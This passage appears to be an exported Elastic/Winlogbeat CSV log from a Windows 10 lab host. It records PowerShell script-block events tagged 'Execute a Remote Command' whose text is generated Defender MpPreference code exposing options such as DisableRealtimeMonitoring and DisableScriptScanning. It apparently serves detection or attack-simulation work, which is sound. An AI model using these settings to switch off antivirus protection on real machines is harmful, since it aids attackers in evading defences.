          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {
          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {
          [object]$__cmdletization_value = ${DisableIOAVProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {
          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {
          [object]$__cmdletization_value = ${DisableScriptScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletiza",15,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3344,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",bnkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.210",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (16 of 20):
tion.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {
          [object]$__cmdletization_value = ${DisableArchiveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {
          [object]$__cmdletization_value = ${DisableCatchupFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {
          [object]$__cmdletization_value = ${DisableCatchupQuickScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {
          [object]$__cmdletization_value = ${DisableEmailScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {
          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {
          [object]$__cmdletization_value = ${DisableRestorePoint}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {
          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {
          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UILockdown')) {
          [object]$__cmdletization_value = ${UILockdown}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {
          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {
          [object]$__cmdletization_value = ${LowThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {
          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodPara

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","tion.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {
          [object]$__cmdletization_value = ${DisableArchiveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {
          [object]$__cmdletization_value = ${DisableCatchupFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {
          [object]$__cmdletization_value = ${DisableCatchupQuickScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {
          [object]$__cmdletization_value = ${DisableEmailScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {
          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {
          [object]$__cmdletization_value = ${DisableRestorePoint}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {
          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {
          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UILockdown')) {
          [object]$__cmdletization_value = ${UILockdown}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {
          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {
          [object]$__cmdletization_value = ${LowThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {
          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodPara",16,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3345,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
